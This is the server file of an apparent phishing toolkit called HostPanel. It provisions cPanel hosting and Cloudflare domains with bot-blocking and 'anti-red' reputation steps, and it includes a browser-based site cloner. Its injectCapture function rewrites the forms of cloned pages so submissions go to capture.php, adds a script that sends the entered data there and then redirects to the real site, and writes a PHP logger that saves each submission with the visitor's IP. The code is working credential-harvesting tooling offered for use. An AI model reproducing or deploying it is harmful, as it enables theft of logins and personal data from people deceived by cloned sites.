import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import { ZipArchive } from "archiver";
import { config } from "./config.js";
import * as whm from "./whm.js";
import * as cf from "./cloudflare.js";
import { verifyTelegramAuth, createSession, destroySession, requireAuth } from "./auth.js";
import fs from "fs";
import { execFileSync } from "child_process";


const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// On VPS bind to all interfaces (nginx proxies); locally stays 127.0.0.1
const HOST = process.env.HOSTPANEL_HOST || "127.0.0.1";

function genUsername(domain) {
  const base = domain.replace(/[^a-z0-9]/gi, "").toLowerCase().slice(0, 8) || "site";
  // WHM usernames: max 16 chars, must start with a letter.
  const suffix = Math.floor(1000 + (Date.now() % 9000));
  let u = (base + suffix).slice(0, 16);
  if (!/^[a-z]/.test(u)) u = "s" + u.slice(0, 15);
  return u;
}

function genPassword() {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789";
  const sym = "!@#$%^&*";
  let p = "";
  for (let i = 0; i < 16; i++) p += chars[Math.floor((Date.now() * (i + 7)) % chars.length)];
  return p + sym[Math.floor(Date.now() % sym.length)] + "9";
}

// --- Read endpoints ---

app.get("/api/status", async (req, res) => {
  const status = { whm: false, cloudflare: false, serverIp: config.serverIp, errors: [] };
  try {
    await whm.listPackages();
    status.whm = true;
  } catch (e) {
    status.errors.push("WHM: " + e.message);
  }
  try {
    await cf.listZones();
    status.cloudflare = true;
  } catch (e) {
    status.errors.push("Cloudflare: " + e.message);
  }
  res.json(status);
});

// --- Auth (Telegram Login) ---

app.get("/api/auth/config", (req, res) => {
  res.json({
    telegramEnabled: !!config.telegram.botToken,
    botUsername: process.env.TG_BOT_USERNAME || "",
  });
});

app.post("/api/auth/telegram", (req, res) => {
  const result = verifyTelegramAuth(req.body || {});
  if (!result.ok) return res.status(401).json({ ok: false, error: result.error });
  const token = createSession(result.chatId, result.name);
  res.setHeader("Set-Cookie", `hp_session=${token}; HttpOnly; SameSite=Lax; Path=/; Max-Age=43200`);
  res.json({ ok: true, name: result.name, token });
});

app.post("/api/auth/logout", (req, res) => {
  const token = (req.headers.cookie || "").match(/hp_session=([a-f0-9]+)/)?.[1];
  if (token) destroySession(token);
  res.setHeader("Set-Cookie", "hp_session=; Path=/; Max-Age=0");
  res.json({ ok: true });
});

// Everything below requires a valid session (or open mode if no bot configured).
app.use("/api", requireAuth);

app.get("/api/accounts", async (req, res) => {
  try {
    res.json({ ok: true, accounts: await whm.listAccounts() });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.get("/api/zones", async (req, res) => {
  try {
    res.json({ ok: true, zones: await cf.listZones() });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

// Create a bare cPanel account (needs a domain/subdomain as the account name).
app.post("/api/create-cpanel", async (req, res) => {
  const { domain, contactemail } = req.body || {};
  if (!domain || !/^[a-z0-9.-]+\.[a-z]{2,}$/i.test(domain)) {
    return res.status(400).json({ ok: false, error: "Enter a valid domain/subdomain for the account" });
  }
  try {
    const username = genUsername(domain);
    const password = genPassword();
    const acct = await whm.createAccount({ domain, username, password, contactemail });
    res.json({
      ok: true,
      cpanel: {
        domain,
        user: username,
        password,
        ip: acct.ip || config.serverIp,
        loginHint: `https://${config.whm.host}:2083`,
      },
    });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

// Link an EXTERNAL domain (from any registrar) onto an existing cPanel account,
// add it to Cloudflare, point DNS at the server, and apply full protection.
app.post("/api/link-domain", async (req, res) => {
  const { domain, cpanelUser, contactemail } = req.body || {};
  const log = [];
  const step = (m) => log.push({ t: Date.now(), m });
  if (!domain || !/^[a-z0-9.-]+\.[a-z]{2,}$/i.test(domain)) {
    return res.status(400).json({ ok: false, error: "Enter a valid domain", log });
  }
  const result = { domain, log };
  try {
    // 1) Add to Cloudflare + get nameservers for the registrar
    step(`Adding ${domain} to Cloudflare…`);
    const zone = await cf.addZone(domain);
    result.zone = { id: zone.id, nameservers: zone.name_servers || [] };
    step(`✓ Nameservers to set at your registrar: ${(zone.name_servers || []).join(", ") || "(pending)"}`);

    // 2) Attach to the cPanel account (if one was chosen)
    if (cpanelUser) {
      step(`Attaching ${domain} to cPanel account ${cpanelUser}…`);
      try {
        await whm.addAddonDomain({ cpanelUser, domain });
        step("✓ Added as addon domain on the cPanel");
      } catch (e) {
        step(`⚠ Addon-domain step skipped: ${e.message}`);
      }
    }

    // 3) Point DNS at the server
    step(`Pointing ${domain} → ${config.serverIp}…`);
    await cf.pointToServer(zone.id, domain, config.serverIp);
    step("✓ A records set (root + www, proxied through Cloudflare)");

    // 4) Reputation records
    step("Writing SPF + DMARC…");
    await cf.setSpf(zone.id, domain, config.serverIp);
    await cf.setDmarc(zone.id, domain, contactemail);
    step("✓ SPF + DMARC set (DMARC p=none for warm-up)");

    // 5) Protection layers (the ones we agreed on)
    step("Applying protection (SSL, HTTPS, security level, bot/browser checks, hotlink)…");
    result.protection = await cf.applyProtection(zone.id);
    result.botFight = await cf.enableBotFightMode(zone.id);
    step("✓ Protection applied + " + result.botFight);

    step("DONE — set the nameservers above at your registrar and the domain goes live.");
    result.ok = true;
    res.json(result);
  } catch (e) {
    step("✗ ERROR: " + e.message);
    result.ok = false;
    result.error = e.message;
    res.status(500).json(result);
  }
});

// --- The main action: provision cPanel + link domain + protect ---

app.post("/api/provision", async (req, res) => {
  const { domain, contactemail } = req.body || {};
  const log = [];
  const step = (m) => log.push({ t: Date.now(), m });

  if (!domain || !/^[a-z0-9.-]+\.[a-z]{2,}$/i.test(domain)) {
    return res.status(400).json({ ok: false, error: "Enter a valid domain (e.g. mysite.com)", log });
  }

  const result = { domain, log };

  try {
    // 1) Create the cPanel account
    const username = genUsername(domain);
    const password = genPassword();
    step(`Creating cPanel account for ${domain} (user: ${username})…`);
    const acct = await whm.createAccount({ domain, username, password, contactemail });
    result.cpanel = {
      user: username,
      password, // shown once so the admin can save it
      ip: acct.ip || config.serverIp,
      loginHint: `https://${config.whm.host}:2083`,
    };
    step(`✓ cPanel created on ${result.cpanel.ip}`);

    // 2) Add / find the zone on Cloudflare
    step(`Adding ${domain} to Cloudflare…`);
    const zone = await cf.addZone(domain);
    result.zone = { id: zone.id, nameservers: zone.name_servers || [] };
    step(`✓ Zone ready. Nameservers: ${(zone.name_servers || []).join(", ") || "(pending)"}`);

    // 3) Point DNS at the server
    step(`Pointing ${domain} → ${config.serverIp}…`);
    await cf.pointToServer(zone.id, domain, config.serverIp);
    step("✓ A records set (root + www, proxied)");

    // 4) Reputation records — the real anti-red
    step("Writing SPF + DMARC (clean-reputation records)…");
    await cf.setSpf(zone.id, domain, config.serverIp);
    await cf.setDmarc(zone.id, domain, contactemail);
    step("✓ SPF + DMARC set (DMARC at p=none for warm-up)");
    // DKIM is managed by cPanel on the server side
    await whm.ensureMailAuth(domain).catch(() => {});

    // 5) Protection — anti-bot + hardening
    step("Applying protection (SSL, HTTPS, bot/browser checks, hotlink)…");
    const applied = await cf.applyProtection(zone.id);
    result.protection = applied;
    result.botFight = await cf.enableBotFightMode(zone.id);
    step("✓ Protection applied: " + applied.filter((x) => !x.includes("SKIPPED")).join(", "));
    step("✓ " + result.botFight);

    step("DONE — set the domain's nameservers at your registrar to the ones above.");
    result.ok = true;
    res.json(result);
  } catch (e) {
    step("✗ ERROR: " + e.message);
    result.ok = false;
    result.error = e.message;
    res.status(500).json(result);
  }
});

// ============================================================
// SITE CLONER v3 — Playwright (real browser) engine
// ============================================================

const CLONE_DIR = path.join(__dirname, "clones");
if (!fs.existsSync(CLONE_DIR)) fs.mkdirSync(CLONE_DIR, { recursive: true });

// ── shared helpers ────────────────────────────────────────────

function urlToLocalPath(absUrl, baseOrigin) {
  try {
    const u = new URL(absUrl);
    let p = u.pathname.replace(/\/+$/, "") || "/index";
    const segs = p.replace(/^\//, "").split("/")
      .map(s => s.replace(/[^a-zA-Z0-9._~-]/g, "_") || "_");
    if (!segs[segs.length - 1].includes(".")) segs[segs.length - 1] += "_f";
    if (u.origin !== baseOrigin) segs.unshift(u.hostname.replace(/[^a-zA-Z0-9.-]/g, "_"));
    return segs.join("/");
  } catch { return "assets/x_" + Math.random().toString(36).slice(2, 7); }
}

function guessExt(localPath, ct) {
  if (/\.[a-z0-9]{1,6}$/i.test(localPath)) return localPath;
  const map = { css:"css", javascript:"js", "x-javascript":"js", png:"png",
    jpeg:"jpg", gif:"gif", svg:"svg", webp:"webp", avif:"avif",
    "woff2":"woff2", woff:"woff", ttf:"ttf", eot:"eot", ico:"ico",
    "octet-stream":"bin" };
  for (const [k, v] of Object.entries(map)) if (ct.includes(k)) return localPath + "." + v;
  return localPath;
}

function extractCssUrls(css) {
  const out = new Set();
  const re1 = /url\(["']?([^"')]+)["']?\)/gi;
  const re2 = /@import\s+["']([^"']+)["']/gi;
  let m;
  while ((m = re1.exec(css)) !== null) { const v = m[1].trim(); if (!v.startsWith("data:")) out.add(v); }
  while ((m = re2.exec(css)) !== null) out.add(m[1].trim());
  return [...out];
}

function rewriteCss(css, cssAbsUrl, assetMap) {
  css = css.replace(/url\(["']?([^"')]+)["']?\)/gi, (orig, src) => {
    if (src.startsWith("data:")) return orig;
    try { const i = assetMap.get(new URL(src.trim(), cssAbsUrl).href); if (i) return `url("${i.localPath}")`; } catch {}
    return orig;
  });
  css = css.replace(/@import\s+["']([^"']+)["']/gi, (orig, src) => {
    try { const i = assetMap.get(new URL(src.trim(), cssAbsUrl).href); if (i) return `@import "${i.localPath}"`; } catch {}
    return orig;
  });
  return css;
}

function injectCapture(html, pageBase, outDir) {
  html = html.replace(/<form([^>]*)(?:\baction=["'][^"']*["'])/gi, `<form$1 action="capture.php"`);
  html = html.replace(/<form(?![^>]*\baction\b)([^>]*)>/gi, `<form$1 action="capture.php">`);
  html = html.replace(/<form([^>]*)\bmethod=["']get["']/gi, `<form$1 method="POST"`);
  const script = `<script>(function(){document.querySelectorAll('form').forEach(function(f){f.addEventListener('submit',function(e){e.preventDefault();var d={};new FormData(f).forEach(function(v,k){d[k]=v;});var x=new XMLHttpRequest();x.open('POST','capture.php');x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({ts:Date.now(),ua:navigator.userAgent,ref:location.href,d:d}));setTimeout(function(){location.href='${pageBase}';},800);});});})();</script>`;
  html = html.replace(/<\/body>/i, script + "\n</body>");
  const php = `<?php $r=file_get_contents('php://input');$ip=$_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR'];file_put_contents(__DIR__.'/captures.txt',date('[Y-m-d H:i:s]')." $ip $r\\n",FILE_APPEND|LOCK_EX);echo '{"ok":true}'; ?>`;
  fs.writeFileSync(path.join(outDir, "capture.php"), php, "utf-8");
  return html;
}

// ── Playwright cloner ─────────────────────────────────────────

// Chromium executable — use system chromium if available, else playwright bundled
function getChromiumPath() {
  const candidates = [
    // Linux (VPS)
    "/usr/bin/chromium-browser",
    "/usr/bin/chromium",
    "/usr/bin/google-chrome-stable",
    "/usr/bin/google-chrome",
    "/snap/bin/chromium",
    // Windows (local dev)
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
    "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
  ];
  for (const c of candidates) { if (fs.existsSync(c)) return c; }
  return null; // playwright will use its own bundled
}

app.post("/api/clone", requireAuth, express.json(), async (req, res) => {
  let { url, folder, captureForm, stripTracking } = req.body || {};
  const log = [];
  const step = m => { log.push({ t: Date.now(), m }); console.log("[clone]", m); };

  if (!url || !/^https?:\/\//i.test(url))
    return res.status(400).json({ ok: false, error: "Enter a valid http(s) URL", log });

  let baseUrl;
  try { baseUrl = new URL(url); }
  catch (e) { return res.status(400).json({ ok: false, error: "Bad URL: " + e.message, log }); }

  folder = (folder || baseUrl.hostname).replace(/[^a-zA-Z0-9_.-]/g, "_").slice(0, 60);
  const outDir = path.join(CLONE_DIR, folder);
  if (fs.existsSync(outDir)) fs.rmSync(outDir, { recursive: true, force: true });
  fs.mkdirSync(outDir, { recursive: true });

  let browser;
  try {
    // ── 1. Launch Playwright Chromium ──────────────────────
    step("Launching browser …");
    const { chromium } = await import("playwright-core");
    const execPath = getChromiumPath();
    browser = await chromium.launch({
      executablePath: execPath || undefined,
      headless: true,
      args: [
        "--no-sandbox", "--disable-setuid-sandbox",
        "--disable-dev-shm-usage", "--disable-gpu",
        "--no-first-run", "--no-zygote",
        "--disable-blink-features=AutomationControlled",
      ],
    });

    const context = await browser.newContext({
      userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      viewport: { width: 1440, height: 900 },
      ignoreHTTPSErrors: true,
    });

    // ── 2. Intercept ALL network responses ─────────────────
    // assetMap: finalUrl → { localPath, buf, ct }
    const assetMap = new Map();
    const baseOrigin = baseUrl.origin;

    context.on("response", async response => {
      try {
        const respUrl = response.url();
        if (respUrl.startsWith("data:") || respUrl.startsWith("blob:")) return;
        const status = response.status();
        if (status < 200 || status >= 400) return;
        const ct = response.headers()["content-type"] || "";
        // skip HTML pages that aren't the main page
        if (ct.includes("html") && respUrl !== url && !assetMap.has(respUrl)) return;
        if (assetMap.has(respUrl)) return;
        const buf = await response.body().catch(() => null);
        if (!buf || buf.length === 0) return;
        const lp = urlToLocalPath(respUrl, baseOrigin);
        assetMap.set(respUrl, { localPath: guessExt(lp, ct), buf, ct, absUrl: respUrl });
      } catch {}
    });

    const page = await context.newPage();

    // ── 3. Navigate + wait for full load ──────────────────
    step(`Navigating to ${url} …`);
    const resp = await page.goto(url, { waitUntil: "networkidle", timeout: 45000 });
    const finalUrl = page.url();
    step(`✓ Page loaded${finalUrl !== url ? " [→ " + finalUrl + "]" : ""}`);

    // scroll to trigger lazy-load images
    await page.evaluate(async () => {
      for (let y = 0; y < document.body.scrollHeight; y += 300) {
        window.scrollTo(0, y);
        await new Promise(r => setTimeout(r, 40));
      }
      window.scrollTo(0, 0);
    });
    // wait for any lazy assets
    await page.waitForTimeout(1500);

    step(`✓ Captured ${assetMap.size} network responses`);

    // ── 4. Get fully-rendered HTML ─────────────────────────
    let html = await page.content();
    await browser.close(); browser = null;
    step(`✓ Got rendered HTML (${(html.length / 1024).toFixed(1)} KB)`);

    // ── 5. Save all intercepted assets ────────────────────
    let saved = 0, cssFiles = [];
    for (const [, info] of assetMap) {
      if (info.ct.includes("html")) continue; // skip sub-pages
      try {
        const fullPath = path.join(outDir, info.localPath);
        fs.mkdirSync(path.dirname(fullPath), { recursive: true });
        if (info.ct.includes("css")) {
          const cssText = info.buf.toString("utf-8");
          // queue CSS for sub-asset discovery
          extractCssUrls(cssText).forEach(u => {
            try {
              const abs = new URL(u.trim(), info.absUrl).href;
              if (!assetMap.has(abs)) {
                const lp = guessExt(urlToLocalPath(abs, baseOrigin), "");
                assetMap.set(abs, { localPath: lp, buf: null, ct: "", absUrl: abs, needFetch: true });
              }
            } catch {}
          });
          info.cssText = cssText;
          fs.writeFileSync(fullPath, cssText, "utf-8");
        } else {
          fs.writeFileSync(fullPath, info.buf);
        }
        saved++;
      } catch {}
    }

    // ── 6. Fetch CSS sub-assets not captured by browser ───
    const { fetch: uFetch2 } = await import("undici");
    const fetchHeaders = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0.0.0 Safari/537.36" };
    let extraFetched = 0;
    for (const [, info] of assetMap) {
      if (!info.needFetch) continue;
      try {
        const ctrl = new AbortController();
        const t = setTimeout(() => ctrl.abort(), 8000);
        const r = await uFetch2(info.absUrl, { headers: fetchHeaders, signal: ctrl.signal, redirect: "follow" });
        clearTimeout(t);
        const buf = Buffer.from(await r.arrayBuffer());
        const ct = r.headers.get("content-type") || "";
        info.localPath = guessExt(info.localPath, ct);
        info.buf = buf; info.ct = ct;
        const fp = path.join(outDir, info.localPath);
        fs.mkdirSync(path.dirname(fp), { recursive: true });
        fs.writeFileSync(fp, buf);
        extraFetched++;
      } catch {}
    }
    if (extraFetched > 0) step(`✓ Fetched ${extraFetched} CSS sub-assets`);

    // ── 7. Rewrite CSS url() references ───────────────────
    let cssRewrites = 0;
    for (const [, info] of assetMap) {
      if (!info.cssText) continue;
      const rewritten = rewriteCss(info.cssText, info.absUrl, assetMap);
      const fp = path.join(outDir, info.localPath);
      if (fs.existsSync(fp)) { fs.writeFileSync(fp, rewritten, "utf-8"); cssRewrites++; }
    }
    if (cssRewrites > 0) step(`✓ Rewrote ${cssRewrites} CSS files`);

    // ── 8. Rewrite HTML: replace all asset URLs ───────────
    // Sort by URL length desc to avoid partial replacement
    const sorted = [...assetMap.values()].sort((a, b) => b.absUrl.length - a.absUrl.length);

    html = html.replace(/(\b(?:src|href|data-src|data-href|data-lazy|data-original|data-bg|poster|content)\s*=\s*)(["'])([^"'>\s]+)\2/gi,
      (full, attr, q, val) => {
        try {
          const abs = new URL(val.trim(), finalUrl).href;
          const info = assetMap.get(abs);
          if (info) return attr + q + info.localPath + q;
        } catch {}
        return full;
      });

    html = html.replace(/srcset\s*=\s*(["'])([^"']+)\1/gi, (_, q, val) => {
      const parts = val.split(",").map(part => {
        const [src, ...rest] = part.trim().split(/\s+/);
        try { const i = assetMap.get(new URL(src.trim(), finalUrl).href); if (i) return [i.localPath, ...rest].join(" "); } catch {}
        return part.trim();
      });
      return `srcset=${q}${parts.join(", ")}${q}`;
    });

    html = html.replace(/style\s*=\s*(["'])([^"']+)\1/gi, (_, q, sv) => {
      const rw = sv.replace(/url\(["']?([^"')]+)["']?\)/gi, (o, u) => {
        if (u.startsWith("data:")) return o;
        try { const i = assetMap.get(new URL(u.trim(), finalUrl).href); if (i) return `url("${i.localPath}")`; } catch {}
        return o;
      });
      return `style=${q}${rw}${q}`;
    });

    html = html.replace(/<style([^>]*)>([\s\S]*?)<\/style>/gi,
      (_, a, css) => `<style${a}>${rewriteCss(css, finalUrl, assetMap)}</style>`);

    // ── 9. Strip tracking ─────────────────────────────────
    if (stripTracking) {
      const trackers = ["google-analytics","gtag","googletagmanager","google_tag","facebook.net",
        "connect.facebook","fbevents","hotjar","mixpanel","segment.com","clarity.ms",
        "doubleclick","adsbygoogle","tiktok","snapchat","bat.bing","criteo"];
      let stripped = 0;
      for (const d of trackers) {
        const before = html.length;
        html = html.replace(new RegExp(`<script[^>]*(?:src)=["'][^"']*${d.replace(/\./g,"\\.")}[^"']*["'][^>]*>(?:[\\s\\S]*?</script>)?`, "gi"), "");
        if (html.length !== before) stripped++;
      }
      html = html.replace(/<script[^>]*>\s*(?:window\.dataLayer|gtag\(|fbq\(|_gaq\.)[\s\S]*?<\/script>/gi, "");
      if (stripped > 0) step(`✓ Stripped ${stripped} trackers`);
    }

    // ── 10. Remove <base> tag ─────────────────────────────
    html = html.replace(/<base\s[^>]*>/gi, "");

    // Fix charset
    if (!/charset/i.test(html.slice(0, 2000)))
      html = html.replace(/<head[^>]*>/i, m => m + '\n<meta charset="utf-8">');

    // ── 11. Form capture ──────────────────────────────────
    if (captureForm) {
      html = injectCapture(html, finalUrl, outDir);
      step("✓ Form capture injected");
    }

    // ── 12. Write index.html ──────────────────────────────
    fs.writeFileSync(path.join(outDir, "index.html"), html, "utf-8");
    step(`DONE — ${folder}/ · ${saved} assets saved`);

    res.json({
      ok: true, folder,
      indexPath: `clones/${folder}/index.html`,
      assetCount: saved,
      captureForm: !!captureForm,
      log,
      downloadUrl: `/api/clone-download?folder=${encodeURIComponent(folder)}`,
    });

  } catch (e) {
    if (browser) { try { await browser.close(); } catch {} }
    step("✗ ERROR: " + e.message);
    res.status(500).json({ ok: false, error: e.message, log });
  }
});

// ── download as ZIP ───────────────────────────────────────────
app.get("/api/clone-download", requireAuth, async (req, res) => {
  const folder = (req.query.folder || "").replace(/[^a-zA-Z0-9_.-]/g, "");
  if (!folder) return res.status(400).json({ error: "No folder" });
  const outDir = path.join(CLONE_DIR, folder);
  if (!fs.existsSync(outDir)) return res.status(404).json({ error: "Clone not found" });

  res.setHeader("Content-Disposition", `attachment; filename="${folder}.zip"`);
  res.setHeader("Content-Type", "application/zip");

  try {
    const archive = new ZipArchive({ zlib: { level: 6 } });
    archive.on("error", e => { try { res.status(500).end(); } catch {} });
    archive.pipe(res);
    archive.directory(outDir, folder);
    await archive.finalize();
  } catch (e) {
    return res.status(500).json({ error: "zip failed: " + e.message });
  }
});

// ── preview + list ────────────────────────────────────────────
app.get("/clones/:folder/index.html", requireAuth, (req, res) => {
  const folder = (req.params.folder || "").replace(/[^a-zA-Z0-9_.-]/g, "");
  const file = path.join(CLONE_DIR, folder, "index.html");
  if (!fs.existsSync(file)) return res.status(404).send("Not found");
  res.sendFile(file);
});

app.use("/clones", requireAuth, express.static(CLONE_DIR));

app.get("/api/clone-list", requireAuth, (req, res) => {
  try {
    if (!fs.existsSync(CLONE_DIR)) return res.json({ ok: true, clones: [] });
    const clones = fs.readdirSync(CLONE_DIR)
      .filter(f => fs.statSync(path.join(CLONE_DIR, f)).isDirectory())
      .map(f => {
        const idx = path.join(CLONE_DIR, f, "index.html");
        const stat = fs.existsSync(idx) ? fs.statSync(idx) : null;
        return {
          folder: f,
          size: stat ? (stat.size / 1024).toFixed(1) + " KB" : "?",
          created: stat ? stat.mtime.toISOString().slice(0, 19).replace("T", " ") : "?"
        };
      });
    res.json({ ok: true, clones });
  } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.delete("/api/clone/:folder", requireAuth, (req, res) => {
  const folder = (req.params.folder || "").replace(/[^a-zA-Z0-9_.-]/g, "");
  const dir = path.join(CLONE_DIR, folder);
  if (!fs.existsSync(dir)) return res.status(404).json({ ok: false, error: "Not found" });
  fs.rmSync(dir, { recursive: true, force: true });
  res.json({ ok: true });
});

// ============================================================
app.listen(config.port, HOST, () => {
  console.log(`\n  HostPanel running → http://${HOST}:${config.port}\n`);
  console.log(`  WHM:        ${config.whm.host} (user ${config.whm.user})`);
  console.log(`  Cloudflare: ${config.cloudflare.token ? "token loaded" : "MISSING TOKEN"}`);
  console.log(`  Server IP:  ${config.serverIp}\n`);
});
